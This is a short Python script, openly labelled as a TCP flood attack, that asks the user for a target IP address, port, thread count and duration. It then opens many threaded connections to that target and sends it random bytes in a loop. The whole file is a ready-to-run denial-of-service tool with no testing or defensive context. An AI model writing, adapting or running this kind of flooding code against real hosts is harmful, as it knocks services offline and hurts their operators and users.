import socket
import threading
import random
import time
import logging
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')

# Generate random data to send
data_to_send = random.randbytes(1024)

# Function to generate and send TCP requests
def send_tcp_request(target_ip, target_port, rpc_count):
    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Disable Nagle's algorithm to send packets immediately
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            # Set a timeout for socket operations
            s.settimeout(0.9)
            # Connect to the target IP and port
            s.connect((target_ip, target_port))
            s.setblocking(False)  # Set socket to non-blocking mode

            # Send random bytes to the target
            for _ in range(rpc_count):
                try:
                    s.sendall(data_to_send)  # Send 1024 random bytes
                except socket.error as e:
                    logging.warning(f"Send error: {e}")
                    break
        except socket.error as e:
            logging.warning(f"Connection error: {e}")
        finally:
            s.close()  # Ensure the socket is closed
        # Small delay to prevent excessive retries
        time.sleep(0.01)

# Function to run the TCP flood attack using multiple threads
def tcp_flood(target_ip, target_port, thread_count, rpc_count, duration):
    end_time = time.time() + duration

    def thread_target():
        while time.time() < end_time:
            send_tcp_request(target_ip, target_port, rpc_count)

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(thread_target) for _ in range(thread_count)]
        for future in futures:
            future.result()  # Wait for all threads to complete

# Main function to get user input and start the attack
def main():
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    thread_count = int(input("Enter the number of threads: "))
    rpc_count = int(input("Enter the number of RPCs per thread: "))
    duration = int(input("Enter the duration of the attack in seconds: "))

    # Start the TCP flood attack
    tcp_flood(target_ip, target_port, thread_count, rpc_count, duration)

if __name__ == "__main__":
    main()

